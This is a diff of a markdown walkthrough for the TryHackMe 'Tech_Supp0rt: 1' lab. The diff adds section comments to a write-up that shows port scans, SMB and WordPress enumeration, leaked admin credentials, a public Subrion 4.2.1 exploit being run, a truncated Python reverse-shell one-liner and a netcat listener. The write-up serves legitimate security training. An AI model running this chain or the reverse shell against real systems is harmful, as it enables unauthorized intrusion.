@@ -1,10 +1,16 @@
+> VOiD XD
+
+This is short writup for [Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1) (Hack into the scammer's under-development website to foil their plans.) on [tryhackme](https://tryhackme.com)
+Go check it out.
+
 > Target IP : 168.119.142.36
 
 
-## Rustscan
+### Rustscan
 Rustscan for quick open ports lookup.
 
 ```bash
+# All ports scan
 rustscan -a 10.10.203.0 -b 1000
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -56,6 +62,8 @@ Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
 
 ## Nmap 
 ```bash
+# Version and Service Scans
+
 nmap -sC -sV -vv 10.10.203.0 -oN scans/init 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 05:28 EDT
 NSE: Loaded 155 scripts for scanning.
@@ -164,6 +172,7 @@ Nmap done: 1 IP address (1 host up) scanned in 54.48 second
 
 ## PORT 139 [smb]
 ```bash
+# Smb Enumeration
 smbclient -L 10.10.203.0
 Enter WORKGROUP\kalis password: 
 
@@ -200,6 +209,7 @@ getting file \enter.txt of size 273 as enter.txt (0.3 KiloBytes/sec) (average 0.
 ```
 
 ```bash
+# Reading file we got
 cat enter.txt         
 GOALS
 =====
@@ -221,6 +231,8 @@ Wordpress creds
 
 ## PORT 80 [http]
 ```bash
+# Directory Enumeration
+
 gobuster dir --url http://10.10.203.0 --wordlist=/usr/share/wordlists/dirb/common.txt -t 40 | tee go.log
 ===============================================================
 Gobuster v3.1.0
@@ -252,14 +264,18 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Checking out findings
 ```bash
+# /test
 http://10.10.203.0/test/ --> gives sample of the test error page
 # nothing important
 
+# /phpinfo.php
 10.10.203.0/phpinfo.php  --> gives all the information about the server
 CONTEXT_DOCUMENT_ROOT 	/var/www/html 
 ```
 
 ```bash
+# Wordpress Enumeration
+
 http://10.10.203.0/wordpress/  --> using wpscan to enumerate
 
 wpscan --url http://10.10.203.0/wordpress/ -P /usr/share/wordlists/rockyou.txt 
@@ -376,6 +392,8 @@ Scan Aborted: Canceled by User
 ```
 
 ```
+# /subrion
+
 Fix subrion site, /subrion doesnt work, edit from panel
 
 but /subrion redirects us to {our_local_ip}/subrion/subrion
@@ -393,6 +411,8 @@ admin:Scam2021
 ```
 
 ```bash
+# Subrion enumeration gives
+
 Subrion version 4.2.1 installed. Cheers!
 
 searchsploit  Subrion   
@@ -427,6 +447,8 @@ Copied to: /home/kali/TryHackMe/Tech_Support/49876.py
 ```
 
 ```bash
+# Gaining Access
+
 ┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
 └─$ python3 exploit.py 
 [+] Specify an url target
@@ -474,6 +496,8 @@ $ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.
 
 ## Shell [www-data]
 ```bash
+#  Shell Stablization
+
 ┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
 └─$ nc -nlvp 4444                                
 listening on [any] 4444 ...
@@ -501,6 +525,8 @@ www-data@TechSupport:/var/www/html/subrion/uploads$
 
 Looking around wordpress site gives this info
 ```bash
+# User Enumeration
+
 www-data@TechSupport:/var/www/html/wordpress$ ls
 index.php	 wp-blog-header.php    wp-includes	  wp-settings.php
 license.txt	 wp-comments-post.php  wp-links-opml.php  wp-signup.php
